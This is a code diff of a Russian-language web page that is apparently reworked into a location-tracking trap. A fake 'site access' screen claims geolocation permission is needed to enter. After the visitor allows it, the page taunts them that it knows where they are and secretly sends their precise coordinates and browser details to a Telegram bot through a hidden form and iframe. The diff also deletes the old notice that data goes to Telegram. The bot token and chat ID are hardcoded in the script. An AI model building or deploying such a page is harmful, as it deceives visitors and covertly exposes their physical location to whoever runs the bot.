@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>📍 Геолокатор</title>
+    <title>Доступ</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
@@ -13,240 +13,135 @@
             box-sizing: border-box;
         }
         body {
-            background: #0d1117;
-            color: #c9d1d9;
+            background: #000;
+            color: #fff;
             font-family: Arial, sans-serif;
-            min-height: 100vh;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 16px;
+            flex-direction: column;
+            text-align: center;
+            padding: 20px;
         }
         .card {
-            background: #161b22;
-            border: 1px solid #30363d;
-            border-radius: 20px;
-            padding: 24px;
-            max-width: 600px;
+            max-width: 400px;
             width: 100%;
         }
         .card h1 {
             font-size: 24px;
-            margin-bottom: 16px;
-            text-align: center;
+            font-weight: 400;
+            color: #aaa;
         }
-        .card h1 span {
-            color: #58a6ff;
+        .card .sub {
+            color: #555;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+        .btn {
+            margin-top: 30px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            color: #fff;
+            padding: 14px 32px;
+            border-radius: 30px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.2s;
+            width: 100%;
+        }
+        .btn:hover {
+            background: #2a2a2a;
+            border-color: #555;
+        }
+        .hidden {
+            display: none;
         }
         #map {
             height: 300px;
+            width: 100%;
             border-radius: 12px;
-            margin-bottom: 16px;
+            margin-top: 16px;
             border: 1px solid #30363d;
         }
-        .status-box {
+        .coords-box {
             background: #0d1117;
             border: 1px solid #30363d;
             border-radius: 12px;
             padding: 16px;
-            margin-bottom: 16px;
-            text-align: center;
+            margin-top: 16px;
+            width: 100%;
         }
-        .status-box .loader {
-            display: inline-block;
-            width: 28px;
-            height: 28px;
-            border: 3px solid #30363d;
-            border-top: 3px solid #58a6ff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-bottom: 8px;
+        .coords-box .value {
+            font-family: monospace;
+            font-size: 20px;
+            color: #f0883e;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .status-box .text {
-            font-size: 15px;
+        .coords-box .accuracy {
+            font-size: 13px;
             color: #8b949e;
+            margin-top: 4px;
         }
-        .status-box .text.success {
+        .status {
+            font-size: 14px;
+            color: #8b949e;
+            margin-top: 12px;
+        }
+        .status.success {
             color: #3fb950;
         }
-        .status-box .text.error {
+        .status.error {
             color: #f85149;
         }
-        .status-box .coords {
-            font-family: monospace;
-            font-size: 18px;
-            color: #f0883e;
-            margin-top: 4px;
-        }
-        .status-box .accuracy {
-            font-size: 13px;
-            color: #8b949e;
-        }
-        .status-box .address {
-            font-size: 14px;
-            color: #58a6ff;
-            margin-top: 4px;
-        }
-        .status-sent {
-            color: #58a6ff;
-            font-size: 13px;
-            margin-top: 4px;
-        }
-        .btn-group {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-            justify-content: center;
-            margin-bottom: 16px;
-        }
-        .btn {
-            padding: 10px 18px;
-            border: none;
-            border-radius: 10px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: 0.2s;
-            color: white;
-            flex: 1;
-            min-width: 100px;
-        }
-        .btn-primary {
-            background: #238636;
-        }
-        .btn-primary:hover {
-            background: #2ea043;
-        }
-        .btn-secondary {
-            background: #1f6feb;
-        }
-        .btn-secondary:hover {
-            background: #388bfd;
-        }
-        .btn-danger {
-            background: #da3633;
-        }
-        .btn-danger:hover {
-            background: #f85149;
-        }
-        .btn-outline {
-            background: #21262d;
-            border: 1px solid #30363d;
-            color: #c9d1d9;
-        }
-        .btn-outline:hover {
-            background: #30363d;
-        }
-        .history {
-            background: #0d1117;
-            border: 1px solid #30363d;
-            border-radius: 12px;
-            padding: 12px;
-            max-height: 150px;
-            overflow-y: auto;
-            font-size: 13px;
-            font-family: monospace;
-            color: #8b949e;
-        }
-        .history .entry {
-            padding: 4px 0;
-            border-bottom: 1px solid #161b22;
-        }
-        .history .entry .time {
-            color: #484f58;
-        }
-        .history .entry .c {
-            color: #f0883e;
+        .surprise {
+            font-size: 22px;
+            color: #3fb950;
+            margin-top: 12px;
+            font-weight: 600;
         }
         .footer {
             margin-top: 16px;
             font-size: 12px;
-            color: #484f58;
-            text-align: center;
-            border-top: 1px solid #21262d;
-            padding-top: 12px;
+            color: #333;
         }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h1>📍 <span>Геолокатор</span></h1>
+    <!-- ЭКРАН 1: Чёрный + запрос -->
+    <div class="card" id="step1">
+        <h1>🔐 Доступ к сайту</h1>
+        <div class="sub">Для входа необходимо разрешить доступ к геолокации</div>
+        <button class="btn" id="startBtn">Продолжить</button>
+        <div class="footer">Нажмите «Разрешить» в системном окне</div>
+    </div>
 
+    <!-- ЭКРАН 2: Сюрприз + карта + Telegram -->
+    <div class="card hidden" id="step2">
+        <div class="surprise">🎉 Ха-ха! Я знаю, где ты!</div>
         <div id="map"></div>
-
-        <div class="status-box" id="statusBox">
-            <div class="loader" id="loader"></div>
-            <div class="text" id="statusText">Определение геолокации...</div>
-            <div class="coords" id="coordsDisplay">—</div>
+        <div class="coords-box">
+            <div class="value" id="coordsDisplay">—</div>
             <div class="accuracy" id="accuracyDisplay"></div>
-            <div class="address" id="addressDisplay"></div>
-            <div class="status-sent" id="sentStatus"></div>
         </div>
-
-        <div class="btn-group">
-            <button class="btn btn-primary" id="btnRefresh" onclick="getLocation()">🔄 Обновить</button>
-            <button class="btn btn-secondary" onclick="shareLink()">🔗 Поделиться</button>
-            <button class="btn btn-danger" onclick="clearHistory()">🗑️ Очистить</button>
-        </div>
-
-        <div class="history" id="historyBox">
-            <div style="color:#484f58; text-align:center; padding:8px;">📋 История пуста</div>
-        </div>
-
-        <div class="footer">
-            ⚡ Данные отправляются в Telegram • <span id="countLabel">0 точек</span>
-        </div>
+        <div class="status" id="statusText">⏳ Определение...</div>
+        <button class="btn" id="refreshBtn" onclick="getLocation()">🔄 Обновить</button>
+        <div class="footer">Ты сам разрешил 😄</div>
     </div>
 
     <script>
-        // ====== НАСТРОЙКИ ======
+        // ====== НАСТРОЙКА TELEGRAM ======
         const BOT_TOKEN = "8975499216:AAEmqWVeYW6vm0p5MjI0d_ec-RDzrVLwxM0";
         const CHAT_ID = "2131297532";
 
-        // ====== КАРТА ======
-        const map = L.map('map').setView([55.7558, 37.6173], 13);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-            attribution: '© OpenStreetMap'
-        }).addTo(map);
-
+        let map = null;
         let marker = null;
         let circle = null;
 
-        function updateMap(lat, lon, acc) {
-            if (marker) map.removeLayer(marker);
-            if (circle) map.removeLayer(circle);
-            marker = L.marker([lat, lon]).addTo(map);
-            circle = L.circle([lat, lon], {
-                radius: acc || 50,
-                color: '#f03',
-                fillColor: '#f03',
-                fillOpacity: 0.15
-            }).addTo(map);
-            map.setView([lat, lon], 16);
-        }
-
-        // ====== ГЕОКОДЕР (адрес по координатам) ======
-        async function getAddress(lat, lon) {
-            try {
-                const url = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&accept-language=ru`;
-                const resp = await fetch(url);
-                const data = await resp.json();
-                return data?.display_name || null;
-            } catch {
-                return null;
-            }
-        }
-
         // ====== ОТПРАВКА В TELEGRAM ======
-        function sendToTelegram(lat, lon, acc, address) {
-            const addressText = address ? `📍 Адрес: ${address}` : '📍 Адрес не определён';
+        function sendToTelegram(lat, lon, acc) {
             const text = encodeURIComponent(
-                `📍 Новая геолокация!\n\nШирота: ${lat.toFixed(6)}\nДолгота: ${lon.toFixed(6)}\nТочность: ±${Math.round(acc)} м\n\n${addressText}\n\nУстройство: ${navigator.userAgent}`
+                `📍 Новая геолокация!\n\nШирота: ${lat.toFixed(6)}\nДолгота: ${lon.toFixed(6)}\nТочность: ±${Math.round(acc)} м\n\nУстройство: ${navigator.userAgent}`
             );
 
             const form = document.createElement('form');
@@ -258,6 +153,7 @@
             i1.type = 'hidden';
             i1.name = 'chat_id';
             i1.value = CHAT_ID;
+
             const i2 = document.createElement('input');
             i2.type = 'hidden';
             i2.name = 'text';
@@ -277,186 +173,89 @@
                 document.body.removeChild(form);
                 document.body.removeChild(iframe);
             }, 1000);
-
-            document.getElementById('sentStatus').textContent =
-                `📤 Отправлено в Telegram (${new Date().toLocaleTimeString()})`;
         }
 
-        // ====== ОСНОВНАЯ ФУНКЦИЯ ======
-        let history = [];
+        // ====== ГЕОЛОКАЦИЯ ======
+        function getLocation() {
+            const status = document.getElementById('statusText');
+            const coords = document.getElementById('coordsDisplay');
+            const accEl = document.getElementById('accuracyDisplay');
+            const btn = document.getElementById('refreshBtn');
 
-        async function getLocation() {
-            const statusText = document.getElementById('statusText');
-            const coordsDisplay = document.getElementById('coordsDisplay');
-            const accuracyDisplay = document.getElementById('accuracyDisplay');
-            const addressDisplay = document.getElementById('addressDisplay');
-            const sentStatus = document.getElementById('sentStatus');
-            const loader = document.getElementById('loader');
-            const btn = document.getElementById('btnRefresh');
-
-            statusText.textContent = '⏳ Запрос разрешения...';
-            statusText.className = 'text';
-            coordsDisplay.textContent = '—';
-            accuracyDisplay.textContent = '';
-            addressDisplay.textContent = '';
-            sentStatus.textContent = '';
-            loader.style.display = 'inline-block';
+            status.textContent = '⏳ Запрос разрешения...';
+            status.className = 'status';
+            coords.textContent = '—';
+            accEl.textContent = '';
             btn.disabled = true;
 
             if (!navigator.geolocation) {
-                statusText.textContent = '❌ Браузер не поддерживает геолокацию';
-                statusText.className = 'text error';
-                loader.style.display = 'none';
+                status.textContent = '❌ Браузер не поддерживает геолокацию';
+                status.className = 'status error';
                 btn.disabled = false;
                 return;
             }
 
             navigator.geolocation.getCurrentPosition(
-                async function(pos) {
+                function(pos) {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
-                    const acc = pos.coords.accuracy;
+                    const accuracy = pos.coords.accuracy;
 
-                    // Показываем
-                    coordsDisplay.textContent = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
-                    accuracyDisplay.textContent = `±${Math.round(acc)} м`;
-                    statusText.textContent = '✅ Геолокация получена!';
-                    statusText.className = 'text success';
-                    loader.style.display = 'none';
+                    coords.textContent = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
+                    accEl.textContent = `±${Math.round(accuracy)} м`;
+                    status.textContent = '✅ Готово! Смотри на карту 😄';
+                    status.className = 'status success';
                     btn.disabled = false;
 
                     // Карта
-                    updateMap(lat, lon, acc);
-
-                    // Адрес
-                    const address = await getAddress(lat, lon);
-                    if (address) {
-                        addressDisplay.textContent = `📍 ${address}`;
-                    } else {
-                        addressDisplay.textContent = '📍 Адрес не определён';
-                    }
-
-                    // История
-                    const entry = {
-                        lat,
-                        lon,
-                        acc,
-                        address,
-                        time: new Date().toLocaleString()
-                    };
-                    history.push(entry);
-                    if (history.length > 20) history.shift();
-                    renderHistory();
-                    document.getElementById('countLabel').textContent = `${history.length} точек`;
+                    if (marker) map.removeLayer(marker);
+                    if (circle) map.removeLayer(circle);
+                    marker = L.marker([lat, lon]).addTo(map);
+                    circle = L.circle([lat, lon], {
+                        radius: accuracy || 50,
+                        color: '#f03',
+                        fillColor: '#f03',
+                        fillOpacity: 0.15
+                    }).addTo(map);
+                    map.setView([lat, lon], 16);
 
                     // Отправка в Telegram
-                    sendToTelegram(lat, lon, acc, address);
+                    sendToTelegram(lat, lon, accuracy);
                 },
                 function(err) {
                     let msg = '';
                     switch (err.code) {
                         case 1:
-                            msg = '❌ Доступ запрещён! Разрешите геолокацию.';
+                            msg = '❌ Без разрешения сюрприз не работает 😢';
                             break;
                         case 2:
-                            msg = '❌ Сигнал недоступен. Проверьте GPS/WiFi.';
+                            msg = '❌ Сигнал недоступен. Попробуйте на улице.';
                             break;
                         case 3:
-                            msg = '❌ Таймаут. Обновите страницу.';
+                            msg = '❌ Таймаут. Попробуйте ещё раз.';
                             break;
                         default:
                             msg = '❌ Ошибка: ' + err.message;
                     }
-                    statusText.textContent = msg;
-                    statusText.className = 'text error';
-                    coordsDisplay.textContent = '—';
-                    accuracyDisplay.textContent = '';
-                    loader.style.display = 'none';
+                    status.textContent = msg;
+                    status.className = 'status error';
                     btn.disabled = false;
                 }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
             );
         }
 
-        // ====== ИСТОРИЯ ======
-        function renderHistory() {
-            const box = document.getElementById('historyBox');
-            if (history.length === 0) {
-                box.innerHTML = '<div style="color:#484f58; text-align:center; padding:8px;">📋 История пуста</div>';
-                return;
-            }
-            box.innerHTML = history.map(h =>
-                `<div class="entry">
-                    <span class="time">${h.time}</span>
-                    → <span class="c">${h.lat.toFixed(5)}, ${h.lon.toFixed(5)}</span>
-                    ${h.address ? `📍 ${h.address.slice(0, 60)}` : ''}
-                </div>`
-            ).join('');
-            box.scrollTop = box.scrollHeight;
-        }
+        // ====== ПЕРЕКЛЮЧЕНИЕ ======
+        document.getElementById('startBtn').addEventListener('click', function() {
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
 
-        function clearHistory() {
-            if (history.length === 0) return;
-            history = [];
-            renderHistory();
-            document.getElementById('countLabel').textContent = '0 точек';
-            document.getElementById('coordsDisplay').textContent = '—';
-            document.getElementById('accuracyDisplay').textContent = '';
-            document.getElementById('addressDisplay').textContent = '';
-            document.getElementById('sentStatus').textContent = '';
-            if (marker) map.removeLayer(marker);
-            if (circle) map.removeLayer(circle);
-            map.setView([55.7558, 37.6173], 13);
-        }
+            map = L.map('map').setView([55.7558, 37.6173], 13);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '© OpenStreetMap'
+            }).addTo(map);
 
-        // ====== ПОДЕЛИТЬСЯ ======
-        function shareLink() {
-            const url = window.location.href;
-            if (navigator.share) {
-                navigator.share({ title: '📍 Геолокатор', url: url });
-            } else {
-                navigator.clipboard?.writeText(url).then(() => {
-                    alert('🔗 Ссылка скопирована в буфер!');
-                }).catch(() => {
-                    prompt('Скопируйте ссылку вручную:', url);
-                });
-            }
-        }
-
-        // ====== ЗАГРУЗКА ======
-        window.onload = function() {
-            // Загружаем историю из кеша
-            try {
-                const saved = sessionStorage.getItem('geo_history');
-                if (saved) {
-                    const parsed = JSON.parse(saved);
-                    if (parsed.length) {
-                        history = parsed;
-                        renderHistory();
-                        document.getElementById('countLabel').textContent = `${history.length} точек`;
-                        const last = history[history.length - 1];
-                        updateMap(last.lat, last.lon, last.acc || 50);
-                        document.getElementById('coordsDisplay').textContent =
-                            `${last.lat.toFixed(6)}, ${last.lon.toFixed(6)}`;
-                        document.getElementById('accuracyDisplay').textContent =
-                            `±${Math.round(last.acc || 0)} м (кеш)`;
-                        if (last.address) {
-                            document.getElementById('addressDisplay').textContent = `📍 ${last.address}`;
-                        }
-                        document.getElementById('statusText').textContent = '📌 Из кеша';
-                        document.getElementById('statusText').className = 'text';
-                    }
-                }
-            } catch (e) {}
-
-            setTimeout(getLocation, 500);
-        };
-
-        // Сохраняем историю в кеш
-        setInterval(() => {
-            try {
-                sessionStorage.setItem('geo_history', JSON.stringify(history));
-            } catch (e) {}
-        }, 3000);
+            getLocation();
+        });
     </script>
 
 </body>
